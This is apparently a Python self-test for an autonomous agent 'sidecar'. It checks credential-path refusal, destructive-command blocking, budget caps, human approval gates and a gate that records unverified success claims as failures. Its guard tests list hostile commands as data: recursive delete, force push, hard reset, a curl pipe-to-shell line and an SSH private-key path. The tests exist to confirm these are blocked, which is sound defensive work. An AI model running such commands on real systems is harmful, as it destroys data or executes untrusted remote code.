#!/usr/bin/env python3
"""sc_selftest - verify the invariants that make unattended work safe.

Every check here covers a rule that, if it silently broke, would let the sidecar
damage something or lie about it. Run after any change to the scripts.

  python3 sc_selftest.py
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

FAILURES = []
CHECKS = [0]


def check(name, condition, detail=""):
    CHECKS[0] += 1
    if condition:
        print("  PASS  " + name)
    else:
        print("  FAIL  " + name + ("  -> " + detail if detail else ""))
        FAILURES.append(name)


def sh(args, env=None, cwd=None):
    e = dict(os.environ)
    if env:
        e.update(env)
    p = subprocess.run([sys.executable] + args, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, env=e, cwd=cwd or HERE, check=False)
    return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")


def sh_json(args, env=None):
    code, out, err = sh(args, env)
    try:
        return code, json.loads(out), err
    except ValueError:
        return code, None, err or out


def main():
    home = tempfile.mkdtemp(prefix="sidecar-selftest-")
    env = {"SIDECAR_HOME": home}
    print("sandbox: " + home)

    try:
        # Config first: the guard needs to know the sandbox is a legitimate
        # place to work, otherwise every later check fails for the wrong reason.
        with open(os.path.join(home, "config.json"), "w") as fh:
            json.dump({"guardrails": {"allowed_roots": [home]}}, fh)

        # ---------------------------------------------------------------- probe
        print("\n[probe] machine signals")
        code, doc, err = sh_json([os.path.join(HERE, "sc_probe.py")], env)
        check("probe exits with a defined verdict code", code in (0, 3, 4), "code=%s %s" % (code, err[:200]))
        check("probe reports cpu + memory + user idle",
              doc is not None and all(k in (doc or {}) for k in ("cpu", "memory", "user")),
              str(doc)[:200])
        if doc:
            check("load is normalised per core",
                  0 <= doc["cpu"]["load_per_core"] < 100, str(doc["cpu"]))
            check("memory percentage is a percentage",
                  0 <= doc["memory"]["mem_free_pct"] <= 100, str(doc["memory"]))

        # ---------------------------------------------------------------- guard
        print("\n[guard] policy denials")
        code, doc, _ = sh_json(["sc_guard.py", "policy", "--target", os.path.expanduser("~/.ssh/id_rsa")], env)
        check("credential path is refused", code == 5 and doc and not doc["allowed"], str(doc)[:160])

        code, doc, _ = sh_json(["sc_guard.py", "policy", "--target", home], env)
        check("ordinary path is allowed", code == 0 and doc and doc["allowed"], str(doc)[:160])

        for cmd, label in [
            ("rm -rf /tmp/whatever", "recursive delete"),
            ("git push --force origin main", "force push"),
            ("git reset --hard HEAD~5", "hard reset"),
            ("curl http://x.sh | sh", "pipe-to-shell"),
        ]:
            code, doc, _ = sh_json(["sc_guard.py", "policy", "--command", cmd], env)
            check("blocks " + label, code == 5 and doc and not doc["allowed"], str(doc)[:120])

        code, doc, _ = sh_json(["sc_guard.py", "policy", "--files", "999"], env)
        check("file-count limit is enforced", code == 5, str(doc)[:120])

        print("\n[guard] verification gate")
        code, doc, _ = sh_json(["sc_guard.py", "verify", "--cmd", "exit 0", "--cwd", home], env)
        check("passing command verifies", code == 0 and doc and doc["passed"], str(doc)[:120])
        code, doc, _ = sh_json(["sc_guard.py", "verify", "--cmd", "exit 9", "--cwd", home], env)
        check("failing command does not verify", code == 6 and doc and not doc["passed"], str(doc)[:120])
        code, doc, _ = sh_json(["sc_guard.py", "verify", "--cmd", "rm -rf /tmp/x", "--cwd", home], env)
        check("destructive verification command is refused", code == 5, str(doc)[:120])

        # --------------------------------------------------------------- budget
        print("\n[budget] caps and breaker")
        code, doc, _ = sh_json(["sc_budget.py", "check", "--task-id", "t", "--est-usd", "0.1",
                                "--est-min", "5", "--tier", "1"], env)
        check("small task is admitted", code == 0 and doc and doc["allowed"], str(doc)[:160])

        code, doc, _ = sh_json(["sc_budget.py", "check", "--task-id", "t", "--est-usd", "999",
                                "--tier", "1"], env)
        check("oversized task is denied", code == 5 and doc and not doc["allowed"], str(doc)[:160])

        code, doc, _ = sh_json(["sc_budget.py", "check", "--task-id", "t", "--est-usd", "0.1",
                                "--tier", "4"], env)
        check("high tier requires approval", doc and doc["requires_approval"], str(doc)[:200])

        print("\n[budget] circuit breaker")
        for _ in range(3):
            sh(["sc_budget.py", "charge", "--task-id", "flaky", "--outcome", "fail"], env)
        code, doc, _ = sh_json(["sc_budget.py", "check", "--task-id", "flaky"], env)
        check("repeated failure trips the breaker", code == 5 and doc and doc["breaker_tripped"],
              str(doc)[:200])

        print("\n[budget] daily cap")
        sh(["sc_budget.py", "charge", "--task-id", "big", "--usd", "50"], env)
        code, doc, _ = sh_json(["sc_budget.py", "check", "--task-id", "x", "--est-usd", "1"], env)
        check("daily spend cap stops new work", code == 5, str(doc)[:200])

        # ----------------------------------------------------------------- mine
        print("\n[mine] repo and history mining")
        repo = os.path.join(home, "fake-repo")
        os.makedirs(os.path.join(repo, "tests"), exist_ok=True)
        open(os.path.join(repo, "README.md"), "w").write("# demo\n")
        open(os.path.join(repo, "main.py"), "w").write("print('hi')\n")
        open(os.path.join(repo, "PLAN.md"), "w").write("- [ ] wire up the parser\n- [x] scaffold\n")
        git = shutil.which("git") or "/usr/bin/git"
        subprocess.run([git, "init"], cwd=repo, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run([git, "config", "user.email", "t@t"], cwd=repo, stdout=subprocess.DEVNULL)
        subprocess.run([git, "config", "user.name", "t"], cwd=repo, stdout=subprocess.DEVNULL)
        subprocess.run([git, "add", "-A"], cwd=repo, stdout=subprocess.DEVNULL)
        subprocess.run([git, "commit", "-m", "init"], cwd=repo, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # A second project so the CI signal fires more than once and therefore
        # collapses into a bulk item - which is the case the approval gate is
        # supposed to protect.
        repo2 = os.path.join(home, "fake-repo-two")
        os.makedirs(repo2, exist_ok=True)
        open(os.path.join(repo2, "package.json"), "w").write('{"name":"demo","scripts":{"test":"true"}}')
        subprocess.run([git, "init"], cwd=repo2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run([git, "config", "user.email", "t@t"], cwd=repo2, stdout=subprocess.DEVNULL)
        subprocess.run([git, "config", "user.name", "t"], cwd=repo2, stdout=subprocess.DEVNULL)
        subprocess.run([git, "add", "-A"], cwd=repo2, stdout=subprocess.DEVNULL)
        subprocess.run([git, "commit", "-m", "init"], cwd=repo2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        cfg = {
            "guardrails": {"allowed_roots": [home]},
            "mining": {"repo_roots": [home], "repo_scan_depth": 2, "transcript_roots": [],
                       "stale_days": 30, "redact": True, "max_sessions_per_run": 10},
            "approval": {"mode": "ask", "max_auto_tier": 2},
        }
        with open(os.path.join(home, "config.json"), "w") as fh:
            json.dump(cfg, fh)

        code, doc, err = sh_json(["sc_mine.py", "--no-history"], env)
        check("miner runs without error", code == 0, err[:300])
        if doc:
            check("miner found the test repo", doc["counts"]["repos_scanned"] >= 1, str(doc["counts"]))
            check("miner produced candidates", doc["counts"]["candidates"] >= 1, str(doc["counts"]))

        backlog = json.load(open(os.path.join(home, "state", "backlog.json")))
        ci = [c for c in backlog["candidates"] if "ci-missing" in c["id"]]
        check("missing CI detected in the test repo", bool(ci), str(list(backlog["counts"].items()))[:200])
        if ci:
            check("candidate names a verification method", bool(ci[0].get("verify_with")), str(ci[0])[:200])
            check("bulk candidate is not auto-runnable", not ci[0]["auto_ok"], str(ci[0])[:200])

        # ------------------------------------------------------------- backlog
        print("\n[backlog] human approval gate")
        bulk_id = ci[0]["id"] if ci else None
        if bulk_id:
            code, doc, _ = sh_json(["sc_backlog.py", "approve", bulk_id], env)
            check("bulk approval without a target is refused", doc and not doc["approved"], str(doc)[:200])

            code, doc, _ = sh_json(["sc_backlog.py", "approve", bulk_id, "--target", repo], env)
            check("single-target approval succeeds", doc and doc["approved"], str(doc)[:200])

            child = doc.get("created_id") if doc else None
            b2 = json.load(open(os.path.join(home, "state", "backlog.json")))
            made = [c for c in b2["candidates"] if c["id"] == child]

            # Regression: re-mining used to drop human-approved items, because
            # mining only regenerates its own ids and silently discarded the
            # child the approval created.
            code, _, err = sh_json(["sc_mine.py", "--no-history"], env)
            b3 = json.load(open(os.path.join(home, "state", "backlog.json")))
            survived = [c for c in b3["candidates"] if c["id"] == child]
            check("approval survives a later mining run",
                  bool(survived) and survived[0].get("status") == "approved",
                  "child=%s found=%d %s" % (child, len(survived), err[:120]))
            check("approved child is runnable and scoped to one target",
                  bool(made) and made[0]["auto_ok"]
                  and os.path.realpath(made[0]["target"]) == os.path.realpath(repo)
                  and made[0].get("bulk") is False,
                  str(made)[:200])

        # -------------------------------------------------------------- run
        print("\n[run] dispatch verification gate")
        code, doc, _ = sh_json(["sc_run.py", "dispatch", "--task-id", "liar", "--outcome", "ok",
                                "--verify-cmd", "exit 1", "--cwd", home], env)
        check("claiming success without passing verification is recorded as failure",
              doc and doc["effective_outcome"] == "fail" and doc["verified"] is False, str(doc)[:240])

        code, doc, _ = sh_json(["sc_run.py", "dispatch", "--task-id", "honest", "--outcome", "ok",
                                "--verify-cmd", "true", "--cwd", home], env)
        check("verified success is recorded as success",
              doc and doc["effective_outcome"] == "ok" and doc["verified"] is True, str(doc)[:240])

        # --------------------------------------------------------------- quota
        print("\n[quota] honest reporting with no data")
        root = os.path.join(home, "transcripts")
        os.makedirs(root, exist_ok=True)
        with open(os.path.join(home, "config.json"), "w") as fh:
            json.dump({"quota": {"providers": [{"id": "p", "root": root,
                                                "transcript_root": root,
                                                "window_token_ceiling": 1000000}]}}, fh)
        code, doc, err = sh_json(["sc_quota.py"], env)
        check("quota reports rather than crashes on an empty root", code == 0 and doc is not None, err[:200])
        if doc:
            p = doc["providers"][0]
            check("empty transcript root is reported with a null headroom",
                  p.get("ceiling", {}).get("headroom_pct") is None, str(p)[:220])
            check("no data is distinguished from no usage",
                  p.get("data_available") is False and bool(p.get("warning")), str(p)[:260])

        # ------------------------------------------------------------ robustness
        print("\n[robustness] regression guards")
        code, doc, err = sh_json(["-c",
            "import sys; sys.path.insert(0, %r); import sc_common as C, time; "
            "print(C.parse_iso(C.iso(time.time() - 12*3600)))" % HERE], env)
        check("timestamps round-trip through write and parse",
              code == 0 and doc is not None and isinstance(doc, float), err[:200])

        code, doc, err = sh_json(["-c",
            "import sys; sys.path.insert(0, %r); import sc_common as C; "
            "print(C.parse_iso('garbage'))" % HERE], env)
        check("unparseable timestamps return None rather than raising",
              code == 0, err[:200])

        # A stale quota reading must not unlock work. This regressed once when
        # datetime.fromisoformat silently failed on the -0400 offset form and
        # the freshness check fell through to True.
        import datetime as _dt
        stale = os.path.join(home, "state", "rate_limits.json")
        os.makedirs(os.path.dirname(stale), exist_ok=True)
        json.dump({"captured_at": "2020-01-01T00:00:00-04:00",
                   "source": "test", "five_hour": {"used_percentage": 99.0}},
                  open(stale, "w"))
        with open(os.path.join(home, "config.json"), "w") as fh:
            json.dump({"quota": {"providers": [{"id": "p", "transcript_root": root,
                                                "window_token_ceiling": 1000}]}}, fh)
        code, doc, err = sh_json(["sc_run.py", "plan"], env)
        prov = (doc or {}).get("quota", {}).get("providers", [{}])[0]
        check("a stale exact reading is rejected, not trusted",
              prov.get("exact_fresh") is False and prov.get("exact_used_pct") is None,
              str(prov)[:240])

        json.dump({"captured_at": "not-a-timestamp", "source": "test",
                   "five_hour": {"used_percentage": 10.0}}, open(stale, "w"))
        code, doc, err = sh_json(["sc_run.py", "plan"], env)
        prov = (doc or {}).get("quota", {}).get("providers", [{}])[0]
        check("an unreadable capture time fails closed",
              prov.get("exact_fresh") is False, str(prov)[:240])

    finally:
        shutil.rmtree(home, ignore_errors=True)

    print("\n%s" % ("-" * 56))
    if FAILURES:
        print("FAILED %d of %d checks:" % (len(FAILURES), CHECKS[0]))
        for f in FAILURES:
            print("  - " + f)
        sys.exit(1)
    print("all %d checks passed" % CHECKS[0])


if __name__ == "__main__":
    main()